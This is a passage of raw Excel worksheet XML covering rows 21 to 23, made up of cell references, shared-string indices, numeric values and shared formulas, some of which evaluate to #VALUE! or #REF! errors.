      <c r="E21" s="225" t="s">
        <v>451</v>
      </c>
      <c r="F21" s="225">
        <v>13</v>
      </c>
      <c r="G21" s="225" t="s">
        <v>452</v>
      </c>
      <c r="H21" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I21" s="225"/>
      <c r="J21" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K21" s="227" t="s">
        <v>468</v>
      </c>
      <c r="L21" s="228" t="s">
        <v>329</v>
      </c>
      <c r="M21" s="227" t="s">
        <v>469</v>
      </c>
      <c r="N21" s="227" t="s">
        <v>470</v>
      </c>
      <c r="O21" s="389" t="s">
        <v>2676</v>
      </c>
      <c r="P21" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q21" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R21" s="225"/>
      <c r="S21" s="396"/>
      <c r="T21" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U21" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V21" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W21" s="231"/>
      <c r="X21" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y21" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z21" s="256" t="s">
        <v>471</v>
      </c>
      <c r="AA21" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB21" s="256" t="s">
        <v>2527</v>
      </c>
      <c r="AC21" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD21" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE21" s="259" t="s">
        <v>475</v>
      </c>
      <c r="AF21" s="270" t="s">
        <v>472</v>
      </c>
      <c r="AG21" s="225" t="s">
        <v>473</v>
      </c>
      <c r="AH21" s="271" t="s">
        <v>474</v>
      </c>
      <c r="AI21" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ21" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK21" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL21" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM21" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN21" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO21" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP21" s="230"/>
      <c r="AQ21" s="230"/>
      <c r="AR21" s="288">
        <v>160</v>
      </c>
      <c r="AS21" s="288">
        <v>159</v>
      </c>
      <c r="AT21" s="288">
        <v>0</v>
      </c>
      <c r="AU21" s="288">
        <f t="shared" si="5"/>
        <v>159</v>
      </c>
      <c r="AV21" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW21" s="288">
        <v>6293</v>
      </c>
      <c r="AX21" s="288">
        <v>6293</v>
      </c>
      <c r="AY21" s="288">
        <v>0</v>
      </c>
      <c r="AZ21" s="288">
        <f t="shared" si="14"/>
        <v>6293</v>
      </c>
      <c r="BA21" s="289" t="s">
        <v>480</v>
      </c>
      <c r="BB21" s="301">
        <v>1761</v>
      </c>
      <c r="BC21" s="302">
        <v>0</v>
      </c>
      <c r="BD21" s="302" t="s">
        <v>476</v>
      </c>
      <c r="BE21" s="302">
        <v>318</v>
      </c>
      <c r="BF21" s="306" t="s">
        <v>192</v>
      </c>
      <c r="BG21" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH21" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI21" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ21" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK21" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL21" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM21" s="302">
        <v>0</v>
      </c>
      <c r="BN21" s="304">
        <v>160</v>
      </c>
      <c r="BO21" s="304">
        <v>12</v>
      </c>
      <c r="BP21" s="304" t="s">
        <v>12</v>
      </c>
      <c r="BQ21" s="304">
        <v>0</v>
      </c>
      <c r="BR21" s="304" t="e">
        <f t="shared" si="7"/>
        <v>#VALUE!</v>
      </c>
      <c r="BS21" s="304">
        <v>13</v>
      </c>
      <c r="BT21" s="304" t="s">
        <v>12</v>
      </c>
      <c r="BU21" s="304">
        <v>1761</v>
      </c>
      <c r="BV21" s="305" t="s">
        <v>12</v>
      </c>
      <c r="BW21" s="317">
        <v>838</v>
      </c>
      <c r="BX21" s="318">
        <v>0</v>
      </c>
      <c r="BY21" s="318" t="s">
        <v>477</v>
      </c>
      <c r="BZ21" s="318">
        <v>429</v>
      </c>
      <c r="CA21" s="318" t="s">
        <v>192</v>
      </c>
      <c r="CB21" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC21" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD21" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE21" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF21" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG21" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH21" s="318">
        <v>0</v>
      </c>
      <c r="CI21" s="319">
        <v>160</v>
      </c>
      <c r="CJ21" s="319">
        <v>110</v>
      </c>
      <c r="CK21" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CL21" s="319">
        <v>0</v>
      </c>
      <c r="CM21" s="319" t="e">
        <f t="shared" si="9"/>
        <v>#VALUE!</v>
      </c>
      <c r="CN21" s="319">
        <v>782</v>
      </c>
      <c r="CO21" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CP21" s="319">
        <v>1761</v>
      </c>
      <c r="CQ21" s="319">
        <v>838</v>
      </c>
      <c r="CR21" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CS21" s="320" t="s">
        <v>12</v>
      </c>
      <c r="CT21" s="339">
        <v>9538</v>
      </c>
      <c r="CU21" s="340">
        <v>0</v>
      </c>
      <c r="CV21" s="340" t="s">
        <v>478</v>
      </c>
      <c r="CW21" s="340">
        <v>508</v>
      </c>
      <c r="CX21" s="340"/>
      <c r="CY21" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ21" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA21" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB21" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC21" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD21" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE21" s="340">
        <v>0</v>
      </c>
      <c r="DF21" s="341">
        <v>160</v>
      </c>
      <c r="DG21" s="341">
        <v>110</v>
      </c>
      <c r="DH21" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DI21" s="341">
        <v>0</v>
      </c>
      <c r="DJ21" s="341" t="e">
        <f t="shared" si="11"/>
        <v>#VALUE!</v>
      </c>
      <c r="DK21" s="341">
        <v>782</v>
      </c>
      <c r="DL21" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DM21" s="341">
        <v>9538</v>
      </c>
      <c r="DN21" s="341">
        <v>838</v>
      </c>
      <c r="DO21" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DP21" s="342" t="s">
        <v>12</v>
      </c>
      <c r="DQ21" s="355">
        <v>13683</v>
      </c>
      <c r="DR21" s="356">
        <v>0</v>
      </c>
      <c r="DS21" s="356" t="s">
        <v>479</v>
      </c>
      <c r="DT21" s="356">
        <v>729</v>
      </c>
      <c r="DU21" s="356"/>
      <c r="DV21" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DW21" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX21" s="356" t="e">
        <f>IF(#REF!="-",DW21,#REF!)</f>
        <v>#REF!</v>
      </c>
      <c r="DY21" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ21" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA21" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB21" s="356">
        <v>0</v>
      </c>
      <c r="EC21" s="357">
        <v>160</v>
      </c>
      <c r="ED21" s="357">
        <v>130</v>
      </c>
      <c r="EE21" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EF21" s="357">
        <v>0</v>
      </c>
      <c r="EG21" s="357" t="e">
        <f t="shared" si="13"/>
        <v>#VALUE!</v>
      </c>
      <c r="EH21" s="357">
        <v>3363</v>
      </c>
      <c r="EI21" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EJ21" s="357">
        <v>9538</v>
      </c>
      <c r="EK21" s="357">
        <v>4145</v>
      </c>
      <c r="EL21" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EM21" s="358" t="s">
        <v>12</v>
      </c>
      <c r="EN21" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO21" s="369">
        <v>6286</v>
      </c>
      <c r="EP21" s="369"/>
      <c r="EQ21" s="369" t="s">
        <v>481</v>
      </c>
      <c r="ER21" s="369">
        <v>102</v>
      </c>
      <c r="ES21" s="369" t="s">
        <v>192</v>
      </c>
      <c r="ET21" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU21" s="369" t="s">
        <v>481</v>
      </c>
      <c r="EV21" s="369"/>
      <c r="EW21" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX21" s="369"/>
      <c r="EY21" s="369" t="s">
        <v>192</v>
      </c>
      <c r="EZ21" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA21" s="369"/>
      <c r="FB21" s="369"/>
      <c r="FC21" s="369">
        <v>160</v>
      </c>
      <c r="FD21" s="369">
        <f t="shared" si="2"/>
        <v>159</v>
      </c>
      <c r="FE21" s="369">
        <v>159</v>
      </c>
      <c r="FF21" s="369">
        <v>0</v>
      </c>
      <c r="FG21" s="369">
        <v>159</v>
      </c>
      <c r="FH21" s="370" t="s">
        <v>482</v>
      </c>
      <c r="FI21" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ21" s="378">
        <v>7336</v>
      </c>
      <c r="FK21" s="378"/>
      <c r="FL21" s="378" t="s">
        <v>483</v>
      </c>
      <c r="FM21" s="378">
        <v>74</v>
      </c>
      <c r="FN21" s="378"/>
      <c r="FO21" s="378"/>
      <c r="FP21" s="378" t="s">
        <v>483</v>
      </c>
      <c r="FQ21" s="378"/>
      <c r="FR21" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS21" s="380"/>
      <c r="FT21" s="380"/>
      <c r="FU21" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV21" s="378"/>
      <c r="FW21" s="378"/>
      <c r="FX21" s="378">
        <v>158</v>
      </c>
      <c r="FY21" s="378">
        <f t="shared" si="4"/>
        <v>157</v>
      </c>
      <c r="FZ21" s="378">
        <v>157</v>
      </c>
      <c r="GA21" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB21" s="378">
        <v>157</v>
      </c>
      <c r="GC21" s="379" t="s">
        <v>12</v>
      </c>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c r="IW21" s="40"/>
      <c r="IX21" s="40"/>
      <c r="IY21" s="40"/>
      <c r="IZ21" s="40"/>
      <c r="JA21" s="40"/>
      <c r="JB21" s="40"/>
      <c r="JC21" s="40"/>
      <c r="JD21" s="40"/>
      <c r="JE21" s="40"/>
      <c r="JF21" s="40"/>
      <c r="JG21" s="40"/>
      <c r="JH21" s="40"/>
      <c r="JI21" s="40"/>
      <c r="JJ21" s="40"/>
      <c r="JK21" s="40"/>
      <c r="JL21" s="40"/>
      <c r="JM21" s="40"/>
      <c r="JN21" s="40"/>
      <c r="JO21" s="40"/>
      <c r="JP21" s="40"/>
      <c r="JQ21" s="40"/>
      <c r="JR21" s="40"/>
      <c r="JS21" s="40"/>
      <c r="JT21" s="40"/>
      <c r="JU21" s="40"/>
      <c r="JV21" s="40"/>
      <c r="JW21" s="40"/>
      <c r="JX21" s="40"/>
      <c r="JY21" s="40"/>
      <c r="JZ21" s="40"/>
      <c r="KA21" s="40"/>
      <c r="KB21" s="40"/>
      <c r="KC21" s="40"/>
      <c r="KD21" s="40"/>
      <c r="KE21" s="40"/>
      <c r="KF21" s="40"/>
      <c r="KG21" s="40"/>
      <c r="KH21" s="40"/>
      <c r="KI21" s="40"/>
      <c r="KJ21" s="40"/>
      <c r="KK21" s="40"/>
      <c r="KL21" s="40"/>
      <c r="KM21" s="40"/>
      <c r="KN21" s="40"/>
      <c r="KO21" s="40"/>
      <c r="KP21" s="40"/>
      <c r="KQ21" s="40"/>
      <c r="KR21" s="40"/>
      <c r="KS21" s="40"/>
      <c r="KT21" s="40"/>
      <c r="KU21" s="40"/>
      <c r="KV21" s="40"/>
      <c r="KW21" s="40"/>
      <c r="KX21" s="40"/>
      <c r="KY21" s="40"/>
      <c r="KZ21" s="40"/>
      <c r="LA21" s="40"/>
      <c r="LB21" s="40"/>
      <c r="LC21" s="40"/>
      <c r="LD21" s="40"/>
      <c r="LE21" s="40"/>
      <c r="LF21" s="40"/>
      <c r="LG21" s="40"/>
      <c r="LH21" s="40"/>
      <c r="LI21" s="40"/>
    </row>
    <row r="22" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B22" s="224" t="s">
        <v>273</v>
      </c>
      <c r="C22" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D22" s="225" t="s">
        <v>274</v>
      </c>
      <c r="E22" s="225" t="s">
        <v>451</v>
      </c>
      <c r="F22" s="225">
        <v>13</v>
      </c>
      <c r="G22" s="225" t="s">
        <v>452</v>
      </c>
      <c r="H22" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I22" s="225"/>
      <c r="J22" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K22" s="227" t="s">
        <v>468</v>
      </c>
      <c r="L22" s="228" t="s">
        <v>12</v>
      </c>
      <c r="M22" s="227" t="s">
        <v>278</v>
      </c>
      <c r="N22" s="227" t="s">
        <v>484</v>
      </c>
      <c r="O22" s="389" t="s">
        <v>2677</v>
      </c>
      <c r="P22" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q22" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R22" s="225"/>
      <c r="S22" s="396"/>
      <c r="T22" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U22" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V22" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W22" s="231"/>
      <c r="X22" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y22" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z22" s="256" t="s">
        <v>471</v>
      </c>
      <c r="AA22" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB22" s="256" t="s">
        <v>2418</v>
      </c>
      <c r="AC22" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD22" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE22" s="259" t="s">
        <v>475</v>
      </c>
      <c r="AF22" s="270" t="s">
        <v>472</v>
      </c>
      <c r="AG22" s="225" t="s">
        <v>473</v>
      </c>
      <c r="AH22" s="271" t="s">
        <v>474</v>
      </c>
      <c r="AI22" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ22" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK22" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL22" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM22" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AN22" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO22" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP22" s="230"/>
      <c r="AQ22" s="230"/>
      <c r="AR22" s="288">
        <v>65681</v>
      </c>
      <c r="AS22" s="288">
        <v>65680</v>
      </c>
      <c r="AT22" s="288">
        <v>0</v>
      </c>
      <c r="AU22" s="288">
        <f t="shared" si="5"/>
        <v>65680</v>
      </c>
      <c r="AV22" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW22" s="288">
        <v>65737</v>
      </c>
      <c r="AX22" s="288">
        <v>65737</v>
      </c>
      <c r="AY22" s="288">
        <v>0</v>
      </c>
      <c r="AZ22" s="288">
        <f t="shared" si="14"/>
        <v>65737</v>
      </c>
      <c r="BA22" s="289" t="s">
        <v>489</v>
      </c>
      <c r="BB22" s="301">
        <v>10</v>
      </c>
      <c r="BC22" s="302">
        <v>0</v>
      </c>
      <c r="BD22" s="302" t="s">
        <v>485</v>
      </c>
      <c r="BE22" s="302">
        <v>10</v>
      </c>
      <c r="BF22" s="306" t="s">
        <v>192</v>
      </c>
      <c r="BG22" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH22" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI22" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ22" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK22" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL22" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM22" s="302">
        <v>0</v>
      </c>
      <c r="BN22" s="304">
        <v>65683</v>
      </c>
      <c r="BO22" s="304">
        <v>3</v>
      </c>
      <c r="BP22" s="304" t="s">
        <v>12</v>
      </c>
      <c r="BQ22" s="304">
        <v>0</v>
      </c>
      <c r="BR22" s="304" t="e">
        <f t="shared" si="7"/>
        <v>#VALUE!</v>
      </c>
      <c r="BS22" s="304">
        <v>8</v>
      </c>
      <c r="BT22" s="304" t="s">
        <v>12</v>
      </c>
      <c r="BU22" s="304">
        <v>10</v>
      </c>
      <c r="BV22" s="305" t="s">
        <v>12</v>
      </c>
      <c r="BW22" s="317">
        <v>27</v>
      </c>
      <c r="BX22" s="318">
        <v>0</v>
      </c>
      <c r="BY22" s="318" t="s">
        <v>486</v>
      </c>
      <c r="BZ22" s="318">
        <v>21</v>
      </c>
      <c r="CA22" s="318" t="s">
        <v>192</v>
      </c>
      <c r="CB22" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC22" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD22" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE22" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF22" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG22" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH22" s="318">
        <v>0</v>
      </c>
      <c r="CI22" s="319">
        <v>65680</v>
      </c>
      <c r="CJ22" s="319">
        <v>16</v>
      </c>
      <c r="CK22" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CL22" s="319">
        <v>0</v>
      </c>
      <c r="CM22" s="319" t="e">
        <f t="shared" si="9"/>
        <v>#VALUE!</v>
      </c>
      <c r="CN22" s="319">
        <v>21</v>
      </c>
      <c r="CO22" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CP22" s="319">
        <v>10</v>
      </c>
      <c r="CQ22" s="319">
        <v>17</v>
      </c>
      <c r="CR22" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CS22" s="320" t="s">
        <v>12</v>
      </c>
      <c r="CT22" s="339">
        <v>35</v>
      </c>
      <c r="CU22" s="340">
        <v>0</v>
      </c>
      <c r="CV22" s="340" t="s">
        <v>487</v>
      </c>
      <c r="CW22" s="340">
        <v>24</v>
      </c>
      <c r="CX22" s="340"/>
      <c r="CY22" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ22" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA22" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB22" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC22" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD22" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE22" s="340">
        <v>0</v>
      </c>
      <c r="DF22" s="341">
        <v>65683</v>
      </c>
      <c r="DG22" s="341">
        <v>17</v>
      </c>
      <c r="DH22" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DI22" s="341">
        <v>0</v>
      </c>
      <c r="DJ22" s="341" t="e">
        <f t="shared" si="11"/>
        <v>#VALUE!</v>
      </c>
      <c r="DK22" s="341">
        <v>22</v>
      </c>
      <c r="DL22" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DM22" s="341">
        <v>18</v>
      </c>
      <c r="DN22" s="341">
        <v>17</v>
      </c>
      <c r="DO22" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DP22" s="342" t="s">
        <v>12</v>
      </c>
      <c r="DQ22" s="355">
        <v>48</v>
      </c>
      <c r="DR22" s="356">
        <v>0</v>
      </c>
      <c r="DS22" s="356" t="s">
        <v>488</v>
      </c>
      <c r="DT22" s="356">
        <v>35</v>
      </c>
      <c r="DU22" s="356"/>
      <c r="DV22" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DW22" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX22" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DY22" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ22" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA22" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB22" s="356">
        <v>0</v>
      </c>
      <c r="EC22" s="357">
        <v>65680</v>
      </c>
      <c r="ED22" s="357">
        <v>19</v>
      </c>
      <c r="EE22" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EF22" s="357">
        <v>0</v>
      </c>
      <c r="EG22" s="357" t="e">
        <f t="shared" si="13"/>
        <v>#VALUE!</v>
      </c>
      <c r="EH22" s="357">
        <v>24</v>
      </c>
      <c r="EI22" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EJ22" s="357">
        <v>18</v>
      </c>
      <c r="EK22" s="357">
        <v>30</v>
      </c>
      <c r="EL22" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EM22" s="358" t="s">
        <v>12</v>
      </c>
      <c r="EN22" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO22" s="369">
        <v>11</v>
      </c>
      <c r="EP22" s="369"/>
      <c r="EQ22" s="369" t="s">
        <v>490</v>
      </c>
      <c r="ER22" s="369">
        <v>3</v>
      </c>
      <c r="ES22" s="369" t="s">
        <v>192</v>
      </c>
      <c r="ET22" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU22" s="369" t="s">
        <v>490</v>
      </c>
      <c r="EV22" s="369"/>
      <c r="EW22" s="369">
        <v>16267</v>
      </c>
      <c r="EX22" s="369"/>
      <c r="EY22" s="369" t="s">
        <v>192</v>
      </c>
      <c r="EZ22" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA22" s="369"/>
      <c r="FB22" s="369"/>
      <c r="FC22" s="369">
        <v>65420</v>
      </c>
      <c r="FD22" s="369">
        <v>13</v>
      </c>
      <c r="FE22" s="369">
        <v>11</v>
      </c>
      <c r="FF22" s="369">
        <v>3</v>
      </c>
      <c r="FG22" s="369">
        <v>13</v>
      </c>
      <c r="FH22" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI22" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ22" s="378">
        <v>7</v>
      </c>
      <c r="FK22" s="378"/>
      <c r="FL22" s="378" t="s">
        <v>492</v>
      </c>
      <c r="FM22" s="378">
        <v>4</v>
      </c>
      <c r="FN22" s="378"/>
      <c r="FO22" s="378">
        <v>31914</v>
      </c>
      <c r="FP22" s="378" t="s">
        <v>493</v>
      </c>
      <c r="FQ22" s="378"/>
      <c r="FR22" s="380" t="s">
        <v>491</v>
      </c>
      <c r="FS22" s="380"/>
      <c r="FT22" s="380"/>
      <c r="FU22" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV22" s="378"/>
      <c r="FW22" s="378"/>
      <c r="FX22" s="378">
        <v>65467</v>
      </c>
      <c r="FY22" s="378">
        <f t="shared" si="4"/>
        <v>65467</v>
      </c>
      <c r="FZ22" s="378">
        <v>10</v>
      </c>
      <c r="GA22" s="378" t="s">
        <v>495</v>
      </c>
      <c r="GB22" s="378" t="s">
        <v>495</v>
      </c>
      <c r="GC22" s="379" t="s">
        <v>494</v>
      </c>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c r="JH22" s="40"/>
      <c r="JI22" s="40"/>
      <c r="JJ22" s="40"/>
      <c r="JK22" s="40"/>
      <c r="JL22" s="40"/>
      <c r="JM22" s="40"/>
      <c r="JN22" s="40"/>
      <c r="JO22" s="40"/>
      <c r="JP22" s="40"/>
      <c r="JQ22" s="40"/>
      <c r="JR22" s="40"/>
      <c r="JS22" s="40"/>
      <c r="JT22" s="40"/>
      <c r="JU22" s="40"/>
      <c r="JV22" s="40"/>
      <c r="JW22" s="40"/>
      <c r="JX22" s="40"/>
      <c r="JY22" s="40"/>
      <c r="JZ22" s="40"/>
      <c r="KA22" s="40"/>
      <c r="KB22" s="40"/>
      <c r="KC22" s="40"/>
      <c r="KD22" s="40"/>
      <c r="KE22" s="40"/>
      <c r="KF22" s="40"/>
      <c r="KG22" s="40"/>
      <c r="KH22" s="40"/>
      <c r="KI22" s="40"/>
      <c r="KJ22" s="40"/>
      <c r="KK22" s="40"/>
      <c r="KL22" s="40"/>
      <c r="KM22" s="40"/>
      <c r="KN22" s="40"/>
      <c r="KO22" s="40"/>
      <c r="KP22" s="40"/>
      <c r="KQ22" s="40"/>
      <c r="KR22" s="40"/>
      <c r="KS22" s="40"/>
      <c r="KT22" s="40"/>
      <c r="KU22" s="40"/>
      <c r="KV22" s="40"/>
      <c r="KW22" s="40"/>
      <c r="KX22" s="40"/>
      <c r="KY22" s="40"/>
      <c r="KZ22" s="40"/>
      <c r="LA22" s="40"/>
      <c r="LB22" s="40"/>
      <c r="LC22" s="40"/>
      <c r="LD22" s="40"/>
      <c r="LE22" s="40"/>
      <c r="LF22" s="40"/>
      <c r="LG22" s="40"/>
      <c r="LH22" s="40"/>
      <c r="LI22" s="40"/>
    </row>
    <row r="23" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B23" s="224" t="s">
        <v>496</v>
      </c>
      <c r="C23" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D23" s="225" t="s">
        <v>497</v>
      </c>
      <c r="E23" s="225" t="s">
        <v>498</v>
      </c>
      <c r="F23" s="225">
        <v>14</v>
      </c>
      <c r="G23" s="225" t="s">
        <v>499</v>
      </c>
      <c r="H23" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I23" s="225"/>
      <c r="J23" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K23" s="227" t="s">
        <v>500</v>
      </c>
      <c r="L23" s="228" t="s">
        <v>329</v>
      </c>
      <c r="M23" s="227" t="s">
        <v>501</v>
      </c>
      <c r="N23" s="227" t="s">
        <v>502</v>
      </c>
      <c r="O23" s="389" t="s">
        <v>2678</v>
      </c>
      <c r="P23" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q23" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R23" s="225"/>
      <c r="S23" s="396"/>
      <c r="T23" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U23" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V23" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W23" s="231"/>
      <c r="X23" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y23" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z23" s="256" t="s">
        <v>504</v>
      </c>
      <c r="AA23" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB23" s="256" t="s">
        <v>2419</v>
      </c>
      <c r="AC23" s="226" t="s">
        <v>505</v>
      </c>
      <c r="AD23" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE23" s="259" t="s">
        <v>509</v>
      </c>
      <c r="AF23" s="270" t="s">
        <v>506</v>
      </c>
      <c r="AG23" s="225" t="s">
        <v>507</v>
      </c>
      <c r="AH23" s="273" t="s">
        <v>508</v>
      </c>
      <c r="AI23" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ23" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK23" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL23" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM23" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN23" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO23" s="290"/>
      <c r="AP23" s="230"/>
      <c r="AQ23" s="230"/>
      <c r="AR23" s="288">
        <v>911</v>
      </c>
      <c r="AS23" s="288">
        <v>450</v>
      </c>
      <c r="AT23" s="288">
        <v>1</v>
      </c>
      <c r="AU23" s="288">
        <f t="shared" si="5"/>
        <v>451</v>
      </c>
      <c r="AV23" s="256" t="s">
        <v>503</v>
      </c>
      <c r="AW23" s="288">
        <v>450</v>
      </c>
      <c r="AX23" s="288">
        <v>450</v>
      </c>
      <c r="AY23" s="288">
        <v>1</v>
      </c>
      <c r="AZ23" s="288">
        <f t="shared" si="14"/>
        <v>451</v>
      </c>
      <c r="BA23" s="289" t="s">
        <v>519</v>
      </c>
      <c r="BB23" s="301">
        <v>18</v>
      </c>
      <c r="BC23" s="302">
        <v>18</v>
      </c>
      <c r="BD23" s="302">
        <v>1394</v>
      </c>
      <c r="BE23" s="302">
        <v>1</v>
      </c>
      <c r="BF23" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG23" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH23" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI23" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ23" s="302" t="str">
        <f t="shared" si="6"/>
        <v>1394, -</v>
      </c>
      <c r="BK23" s="302">
        <v>1394</v>
      </c>
      <c r="BL23" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM23" s="302">
        <v>1</v>
      </c>
      <c r="BN23" s="304">
        <v>913</v>
      </c>
      <c r="BO23" s="304">
